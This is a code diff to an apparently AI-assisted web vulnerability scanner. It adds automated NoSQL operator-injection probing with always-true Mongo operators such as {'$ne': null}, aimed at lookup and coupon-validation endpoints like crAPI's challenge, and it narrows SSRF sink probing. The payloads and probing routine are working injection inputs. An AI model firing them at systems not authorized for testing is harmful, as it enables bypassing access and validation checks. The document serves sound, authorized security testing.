@@ -364,6 +364,7 @@ def highlight_findings(output: str, limit: int = 12) -> list[tuple[str, str]]:
 # nothing" can be distinguished from "we probed X and here it is".
 _COVERAGE_WORDS = {
     "SQL injection": ("sql injection",),
+    "NoSQL injection": ("nosql injection",),
     "Command injection": ("command injection",),
     "Path traversal / LFI": ("local file", "path traversal"),
     "Template injection": ("template injection",),
@@ -2605,6 +2606,94 @@ class AssistSession:
     # rather than re-compiled here so the two can never drift apart.
     _AUTH_ERROR_RE = AUTH_ERROR_RE
 
+    # Fields a lookup/validate endpoint filters on, where a client-supplied NoSQL operator
+    # bypasses the check. `coupon_code` is crAPI challenge 12; the rest are near-universal.
+    _NOSQL_FIELDS = ("coupon_code", "couponCode", "coupon", "code", "id", "_id", "user",
+                     "username", "email", "query", "q", "search", "filter", "name",
+                     "token", "key", "slug", "ref")
+
+    def confirm_nosqli(self, url: str, param: str, extra=None) -> bool:
+        """NoSQL (Mongo-style) OPERATOR injection through the governed browser. A benign
+        value that should NOT match is compared with an always-true operator supplied as a
+        JSON object (`{"$ne": null}` / `{"$gt": ""}` / `{"$regex": ".*"}`): if the operator
+        is accepted where the benign value is refused — or returns materially more — the
+        query trusts a client-supplied operator. crAPI challenge 12 (free coupons without a
+        code) is exactly this shape. Differential proof, JSON body, no LLM in the decision."""
+        import json as _json
+        from .web import WebAction
+        if self.browser is None:
+            return False
+
+        def post(value):
+            try:
+                _d, r = self.browser.run(WebAction(
+                    "request", url=url, method="POST",
+                    body=_json.dumps({param: value, **(extra or {})}),
+                    headers={"Content-Type": "application/json"}))
+            except Exception:
+                return None, ""
+            return (r.status if r else None), ((r.body if r else "") or "")
+
+        benign = "brk" + str(random.randint(10 ** 6, 10 ** 7))   # matches nothing
+        bs, bb = post(benign)
+        if bs is None:
+            return False
+        benign_ok = bool(bs and 200 <= bs < 300)
+        for op in ({"$ne": None}, {"$gt": ""}, {"$regex": ".*"}):
+            os_, ob = post(op)
+            if os_ is None:
+                continue
+            op_ok = bool(os_ and 200 <= os_ < 300)
+            if op_ok and not benign_ok:
+                self._record_confirmed(
+                    url, "NoSQL injection (operator)", "critical", param,
+                    f"a benign {param}={benign!r} is refused ({bs}), but the always-true "
+                    f"operator {op!r} is ACCEPTED ({os_}) — the query trusts a "
+                    f"client-supplied operator", category="api")
+                return True
+            if op_ok and benign_ok and len(ob) > max(len(bb) * 2, 200):
+                self._record_confirmed(
+                    url, "NoSQL injection (operator)", "critical", param,
+                    f"the always-true operator {op!r} returns {len(ob)}B where a benign "
+                    f"{param} returns {len(bb)}B — the filter matches on a client operator",
+                    category="api")
+                return True
+        return False
+
+    def confirm_nosqli_sinks(self) -> int:
+        """Fire the NoSQL-operator question at lookup/validate endpoints the harness itself,
+        for the injectable JSON body fields a crawl never surfaces (crAPI's `coupon_code`).
+        Bounded, governed. Gated on allow_intrusive because an operator body is a WRITE-
+        shaped request to a validate endpoint. Returns the number confirmed."""
+        if self.browser is None or not self.allow_intrusive or self.surface is None:
+            return 0
+        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
+        routes = list(getattr(self.surface, "confirmed_routes", []) or [])
+        hint = ("coupon", "validate", "redeem", "apply", "lookup", "search", "find",
+                "check", "verify", "login", "query", "filter")
+        # FILTER, not rank: only lookup/validate endpoints are probed, so an operator body
+        # is never POSTed to an unrelated write (which would create state, not test a query).
+        ranked = [r for r in routes if any(h in r.lower() for h in hint)]
+        confirmed = 0
+        for route in ranked[:6]:
+            if "{" in route or (getattr(self, "_confirm_budget", 1) or 1) <= 0 \
+                    or self._rate_limited:
+                break
+            url = route if route.startswith("http") else base + (
+                route if route.startswith("/") else "/" + route)
+            for field in self._NOSQL_FIELDS:
+                if (getattr(self, "_confirm_budget", 1) or 1) <= 0 or self._rate_limited:
+                    break
+                if getattr(self, "_confirm_budget", None) is not None:
+                    self._confirm_budget -= 1
+                try:
+                    if self.confirm_nosqli(url, field):
+                        confirmed += 1
+                        break                # one confirmed operator per endpoint
+                except Exception:
+                    continue
+        return confirmed
+
     def confirm_unauth_access(self, url: str, spec_path: str = "") -> bool:
         """Broken authentication: an endpoint the API's OWN SPEC declares as requiring
         credentials answers a request that carries none (OWASP API2/API5).
@@ -4007,8 +4096,10 @@ class AssistSession:
         routes = list(getattr(self.surface, "confirmed_routes", []) or [])
         hint = ("contact", "mechanic", "import", "fetch", "webhook", "avatar", "convert",
                 "upload", "url", "proxy", "callback", "notify", "subscribe", "preview")
-        ranked = sorted(routes,
-                        key=lambda r: 0 if any(h in r.lower() for h in hint) else 1)
+        # FILTER, not rank: only endpoints whose path hints at a URL-fetching action are
+        # probed. Posting a URL into every confirmed route would create unwanted state on
+        # unrelated writes (a live run POSTed to /add_vehicle 70+ times); a sink is named.
+        ranked = [r for r in routes if any(h in r.lower() for h in hint)]
         confirmed = 0
         for route in ranked[:8]:
             if "{" in route or (getattr(self, "_confirm_budget", 1) or 1) <= 0 \
@@ -8341,6 +8432,16 @@ class AssistSession:
                     self._covered("Blind injection (out-of-band)",
                                   note="OOB callback from a URL POSTed into each sink field")
                     confirmed += self.confirm_ssrf_sinks()
+                except Exception:
+                    pass
+
+                # 7c) NoSQL OPERATOR injection at lookup/validate endpoints — the harness
+                #     fires the `{"$ne": null}` question at JSON body fields the crawl never
+                #     surfaced (crAPI's `coupon_code`), which no SQLi differential reaches.
+                try:
+                    self._covered("NoSQL injection",
+                                  note="benign vs always-true operator differential")
+                    confirmed += self.confirm_nosqli_sinks()
                 except Exception:
                     pass
 
